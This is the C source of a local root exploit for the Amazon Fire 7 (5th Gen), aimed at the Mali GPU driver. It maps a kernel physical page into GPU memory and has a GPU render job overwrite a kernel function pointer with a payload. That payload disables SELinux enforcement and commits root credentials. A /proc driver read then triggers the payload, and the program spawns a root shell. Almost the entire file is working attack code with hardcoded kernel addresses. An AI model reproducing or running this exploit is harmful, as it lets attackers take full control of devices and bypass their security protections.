/*
 * kort_fire_7.c - Overwrite kernel function pointer via Mali GPU DMA
 *   1. MAP_EXT_MEM maps kernel phys page into GPU VA space
 *   2. PP job writes clear_color (&get_root_shell) to that GPU VA via write-back
 *   3. Trigger via /proc/driver/wmt_aee -> code exec -> root
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <linux/ioctl.h>

#define PAGE_SIZE 4096

#define MALI_IOC_BASE           0x82
#define _MALI_UK_MEMORY_SUBSYSTEM  1
#define _MALI_UK_PP_SUBSYSTEM      2
#define _MALI_UK_CORE_SUBSYSTEM    0

#define MALI_IOC_CORE_BASE      (_MALI_UK_CORE_SUBSYSTEM   + MALI_IOC_BASE)
#define MALI_IOC_MEMORY_BASE    (_MALI_UK_MEMORY_SUBSYSTEM + MALI_IOC_BASE)
#define MALI_IOC_PP_BASE        (_MALI_UK_PP_SUBSYSTEM     + MALI_IOC_BASE)

#define _MALI_UK_PP_START_JOB            0
#define _MALI_UK_WAIT_FOR_NOTIFICATION   2
#define _MALI_UK_MAP_EXT_MEM            13
#define _MALI_UK_UNMAP_EXT_MEM          14

#define MALI_IOC_PP_START_JOB \
	_IOWR(MALI_IOC_PP_BASE, _MALI_UK_PP_START_JOB, void *)
#define MALI_IOC_WAIT_FOR_NOTIFICATION \
	_IOWR(MALI_IOC_CORE_BASE, _MALI_UK_WAIT_FOR_NOTIFICATION, void *)
#define MALI_IOC_MEM_MAP_EXT \
	_IOWR(MALI_IOC_MEMORY_BASE, _MALI_UK_MAP_EXT_MEM, uint32_t)
#define MALI_IOC_MEM_UNMAP_EXT \
	_IOW(MALI_IOC_MEMORY_BASE, _MALI_UK_UNMAP_EXT_MEM, uint32_t)

// for MAP_EXT_MEM
typedef struct {
	uint32_t ctx;
	uint32_t phys_addr;
	uint32_t size;
	uint32_t mali_address;
	uint32_t rights;
	uint32_t flags;
	uint32_t cookie;
} mali_map_ext_mem_s;

typedef struct {
	uint32_t ctx;
	uint32_t cookie;
} mali_unmap_ext_mem_s;

// PP job structs
#define _MALI_PP_MAX_SUB_JOBS 8
#define MALI_UK_TIMELINE_MAX 3

typedef struct {
	uint32_t points[MALI_UK_TIMELINE_MAX];
	int32_t  sync_fd;
} mali_uk_fence_t;

typedef struct {
	void    *ctx;
	uint32_t user_job_ptr;
	uint32_t priority;
	uint32_t frame_registers[23];
	uint32_t frame_registers_addr_frame[7];
	uint32_t frame_registers_addr_stack[7];
	uint32_t wb0_registers[12];
	uint32_t wb1_registers[12];
	uint32_t wb2_registers[12];
	uint32_t dlbu_registers[4];
	uint32_t num_cores;
	uint32_t perf_counter_flag;
	uint32_t perf_counter_src0;
	uint32_t perf_counter_src1;
	uint32_t frame_builder_id;
	uint32_t flush_id;
	uint32_t flags;
	uint32_t tilesx;
	uint32_t tilesy;
	uint32_t heatmap_mem;
	uint32_t num_memory_cookies;
	uint32_t *memory_cookies;
	mali_uk_fence_t fence;
	uint32_t *timeline_point_ptr;
} pp_start_job_s;

#define _MALI_NOTIFICATION_PP_FINISHED  ((_MALI_UK_PP_SUBSYSTEM << 16) | 0x10)

typedef struct {
	void *ctx;
	uint32_t type;
	union {
		struct {
			uint32_t user_job_ptr;
			uint32_t status;
			uint32_t perf_counter0[_MALI_PP_MAX_SUB_JOBS];
			uint32_t perf_counter1[_MALI_PP_MAX_SUB_JOBS];
		} pp_job_finished;
		uint32_t padding[64];
	} data;
} wait_for_notification_s;

// Frame register indices
#define FR_PLBU_ARRAY_ADDR   0
#define FR_RENDER_ADDR       1
#define FR_FLAGS             3
#define FR_CLEAR_DEPTH       4
#define FR_CLEAR_STENCIL     5
#define FR_CLEAR_COLOR       6
#define FR_CLEAR_COLOR_1     7
#define FR_CLEAR_COLOR_2     8
#define FR_CLEAR_COLOR_3     9
#define FR_WIDTH            10
#define FR_HEIGHT           11
#define FR_FRAG_STACK_ADDR  12
#define FR_FRAG_STACK_SIZE  13
#define FR_DUBYA            18
#define FR_BLOCKING         20
#define FR_SCALE            21
#define FR_FOUREIGHT        22

// WB register indices
#define WB_TYPE           0
#define WB_ADDRESS        1
#define WB_PIXEL_FORMAT   2
#define WB_DOWNSAMPLE     3
#define WB_PIXEL_LAYOUT   4
#define WB_PITCH          5
#define WB_MRT_BITS       6

// Fragment shader (constant color output)
static const uint32_t fragment_shader[] = {
	0x00020425, 0x0000000c, 0x01e007cf, 0xb0000000, 0x000005f5,
};

// target stuff
#define TARGET_KERNEL_VA   0xc086b8f4	// what we wanna write (not used)
#define TARGET_PHYS_ADDR   0x8086b000   // page-aligned physical address
#define TARGET_PAGE_OFFSET 0x518        // offset within page we wanna write

//useful addresses
#define ENFORCING_ADDR	   0xc0c820b0
#define COMMIT_CREDS	   0xc00837a0
#define PREPARE_KERNEL_CRED 0xc0083b44

// GPU VA layout
#define GPU_VA_DATA    0x40000000   /* PP job data (PLB, RSW, shader) */
#define GPU_VA_TARGET  0x40030000   /* mapped kernel phys page */
#define BUF_SIZE       (PAGE_SIZE * 4)

static const char *job_status_str(uint32_t status)
{
	if (status & (1<<16)) return "SUCCESS";
	if (status & (1<<17)) return "OUT_OF_MEMORY";
	if (status & (1<<18)) return "ABORT";
	if (status & (1<<19)) return "TIMEOUT";
	if (status & (1<<20)) return "HANG";
	if (status & (1<<21)) return "SEG_FAULT";
	if (status & (1<<22)) return "ILLEGAL_JOB";
	if (status & (1<<23)) return "UNKNOWN_ERR";
	return "???";
}

// stuff for root shell
typedef struct cred *(*prepare_kernel_cred_t)(void *);
typedef int (*commit_creds_t)(struct cred *);

void get_root_shell() {
	uint32_t* enforcing = (uint32_t*) ENFORCING_ADDR;
	*enforcing = 0;

    prepare_kernel_cred_t prepare_kernel_cred = (prepare_kernel_cred_t)PREPARE_KERNEL_CRED;
    commit_creds_t commit_creds = (commit_creds_t)COMMIT_CREDS;

    commit_creds(prepare_kernel_cred(NULL));
}


void important_ascii_art() {
    printf("\n");
    printf("\033[38;5;22m");
    printf("██   ██  ██████  ██████  ████████ \n");
    printf("\033[38;5;28m");
    printf("██  ██  ██    ██ ██   ██    ██    \n");
    printf("\033[38;5;34m");
    printf("█████   ██    ██ ██████     ██    \n");
    printf("\033[38;5;40m");
    printf("██  ██  ██    ██ ██   ██    ██    \n");
    printf("\033[38;5;46m");
    printf("██   ██  ██████  ██   ██    ██    \n");
    printf("\033[0m");
	printf("\n\033[38;5;34m    Amazon Fire 7 (5th Gen)\033[0m\n\n");
}

int main(void)
{
	important_ascii_art();

	int ret;

	// Open mali ting
	int fd = open("/dev/mali", O_RDWR);
	if (fd < 0) {
		printf("[-] open /dev/mali: %s\n", strerror(errno));
		return 1;
	}
	printf("[+] Successfully opened /dev/mali (fd=%d)\n", fd);

	// Step 2: mmap GPU buffer for PP job data (PLB, RSW, shader, stack)
	printf("\n[1] mmap GPU buffer for PP job data\n");
	void *data_buf = mmap(NULL, BUF_SIZE, PROT_READ | PROT_WRITE,
	                      MAP_SHARED, fd, GPU_VA_DATA);
	if (data_buf == MAP_FAILED) {
		printf("[-] mmap data: %s\n", strerror(errno));
		close(fd);
		return 1;
	}
	printf("[+] Data buf: CPU=%p GPU=0x%08x\n", data_buf, GPU_VA_DATA);

	// Step 2: MAP_EXT_MEM - map kernel phys page into GPU VA - bug
	printf("\n[2] Mapping kernel phys 0x%08X -> GPU VA 0x%08X ...\n",
	       TARGET_PHYS_ADDR, GPU_VA_TARGET);

	mali_map_ext_mem_s ext_args;
	memset(&ext_args, 0, sizeof(ext_args));
	ext_args.phys_addr    = TARGET_PHYS_ADDR;
	ext_args.size         = PAGE_SIZE;
	ext_args.mali_address = GPU_VA_TARGET;
	ext_args.rights       = 0x37;  // READ|WRITE|EXEC + cache flags

	// send ioctl
	ret = ioctl(fd, MALI_IOC_MEM_MAP_EXT, &ext_args);
	if (ret != 0) {
		printf("[-] MAP_EXT_MEM failed: %s (errno=%d)\n", strerror(errno), errno);
		munmap(data_buf, BUF_SIZE);
		close(fd);
		return 1;
	}
	printf("[+] MAP_EXT_MEM succeeded! cookie=%u\n", ext_args.cookie);
	printf("[+] Kernel page phys 0x%08X now at GPU VA 0x%08X\n",
	       TARGET_PHYS_ADDR, GPU_VA_TARGET);

	// WB target: GPU VA of the function pointer within the mapped page
	uint32_t wb_target = GPU_VA_TARGET + TARGET_PAGE_OFFSET;
	printf("[+] WB target address: 0x%08X (func ptr at page offset 0x%03X)\n",
	       wb_target, TARGET_PAGE_OFFSET);

	// Step 3: Set up PP job data in GPU memory
	printf("\n[3] Setting up WB PP job in GPU\n");
	memset(data_buf, 0, BUF_SIZE);

	uint32_t gpu_plb       = GPU_VA_DATA + 0x000;
	uint32_t gpu_shader    = GPU_VA_DATA + 0x080;
	uint32_t gpu_rsw       = GPU_VA_DATA + 0x100;
	uint32_t gpu_tileblock = GPU_VA_DATA + 0x200;
	uint32_t gpu_stack     = GPU_VA_DATA + 0x1000;

	// Fragment shader
	memcpy((uint8_t *)data_buf + 0x080, fragment_shader, sizeof(fragment_shader));

	// RSW (Render State Word) 
	uint32_t *rsw = (uint32_t *)((uint8_t *)data_buf + 0x100);
	rsw[0x08] = 0x0000F008;
	rsw[0x09] = gpu_shader | 5;
	rsw[0x0D] = 0x00000100;

	// PLB: 1 tile at (0,0) + terminator
	uint32_t *plb = (uint32_t *)data_buf;
	plb[0] = 0x00000000;
	plb[1] = 0xB8000000;                                          /* tile (0,0) */
	plb[2] = 0xE0000002 | ((gpu_tileblock >> 3) & ~0xE0000003u);  /* tile data */
	plb[3] = 0xB0000000;
	plb[4] = 0x00000000;   /* terminator */
	plb[5] = 0xBC000000;   /* terminator */

	// Build PP job
	pp_start_job_s job;
	memset(&job, 0, sizeof(job));

	job.user_job_ptr = 0xCAFEBABE;
	job.priority = 0;
	job.num_cores = 1;

	// Frame registers
	job.frame_registers[FR_PLBU_ARRAY_ADDR]  = gpu_plb;
	job.frame_registers[FR_RENDER_ADDR]      = gpu_rsw;
	job.frame_registers[FR_FLAGS]            = 0x01;
	job.frame_registers[FR_CLEAR_DEPTH]      = 0x00FFFFFF;
	job.frame_registers[FR_CLEAR_STENCIL]    = 0;
	job.frame_registers[FR_CLEAR_COLOR]      = (uint32_t) get_root_shell;
	job.frame_registers[FR_CLEAR_COLOR_1]    = (uint32_t) get_root_shell;
	job.frame_registers[FR_CLEAR_COLOR_2]    = (uint32_t) get_root_shell;
	job.frame_registers[FR_CLEAR_COLOR_3]    = (uint32_t) get_root_shell;
	job.frame_registers[FR_WIDTH]            = 0x100;
	job.frame_registers[FR_HEIGHT]           = 0x100;
	job.frame_registers[FR_FRAG_STACK_ADDR]  = gpu_stack;
	job.frame_registers[FR_FRAG_STACK_SIZE]  = 0;
	job.frame_registers[FR_DUBYA]            = 0x77;
	job.frame_registers[FR_BLOCKING]         = 0;
	job.frame_registers[FR_SCALE]            = 0x0C;
	job.frame_registers[FR_FOUREIGHT]        = 0x8888;

	// WB0: write get_root_shell to the kernel function pointer via GPU DMA
	job.wb0_registers[WB_TYPE]         = 0x02;       /* color source */
	job.wb0_registers[WB_ADDRESS]      = wb_target;  /* GPU VA of kernel func ptr */
	job.wb0_registers[WB_PIXEL_FORMAT] = 0x03;       /* RGBA8888 */
	job.wb0_registers[WB_DOWNSAMPLE]   = 0;
	job.wb0_registers[WB_PIXEL_LAYOUT] = 0;
	job.wb0_registers[WB_PITCH]        = (16 * 4) / 8;
	job.wb0_registers[WB_MRT_BITS]     = 4;

	// Fence
	job.fence.sync_fd = -1;

	// Timeline
	uint32_t timeline_point = 0;
	job.timeline_point_ptr = &timeline_point;

	printf("[*] PP Job: clear_color=0x%08X -> WB addr=0x%08X\n",
	       (uint32_t) get_root_shell, wb_target);

	// Step 4: Submit PP job
	printf("\n[4] Submitting PP job (writing to kernel memory)...\n");
	ret = ioctl(fd, MALI_IOC_PP_START_JOB, &job);
	if (ret != 0) {
		printf("[-] PP job failed: %s (errno=%d)\n", strerror(errno), errno);
		goto cleanup;
	}
	printf("[+] PP job submitted!\n");

	// Step 5: Wait for completion
	printf("\n[5] Waiting for completion...\n");
	wait_for_notification_s notif;
	memset(&notif, 0, sizeof(notif));
	ret = ioctl(fd, MALI_IOC_WAIT_FOR_NOTIFICATION, &notif);
	if (ret != 0) {
		printf("[-] Wait failed: %s\n", strerror(errno));
		goto cleanup;
	}

	if (notif.type == _MALI_NOTIFICATION_PP_FINISHED) {
		uint32_t st = notif.data.pp_job_finished.status;
		printf("[+] PP finished: status=0x%08x (%s)\n", st, job_status_str(st));

		// open the device we use to do the memory write
		const char *proc_path = "/proc/driver/wmt_dbg";
		int aee_fd = open(proc_path, O_RDONLY);
		if (aee_fd < 0) {
			printf("[-] open %s: %s\n", proc_path, strerror(errno));
			goto cleanup;
		}

		// Step 6: patch the free handler with the root shell function
		printf("\n[6] Triggering code execution via %s\n", proc_path);

		char buffer[0x400];
		read(aee_fd, buffer, sizeof(buffer));

		close(aee_fd);
	} else {
		printf("[?] Unexpected notification type: 0x%08x\n", notif.type);
	}

	printf("\n[7] Did we get root?\n");

	if (getuid() == 0) {
        printf("[+] We got root! Popping shell...\n");
        char* shell = "/system/bin/sh";
        char* args[] = {shell, "-i", NULL};
        execve(shell, args, NULL);
    } else {
        printf("[-] Utgard won the battle but not the war... try again\n");
    }

cleanup:
	/* Unmap external memory */
	{
		mali_unmap_ext_mem_s unmap_args;
		memset(&unmap_args, 0, sizeof(unmap_args));
		unmap_args.cookie = ext_args.cookie;
		ioctl(fd, MALI_IOC_MEM_UNMAP_EXT, &unmap_args);
	}
	munmap(data_buf, BUF_SIZE);
	close(fd);
	return 0;
}
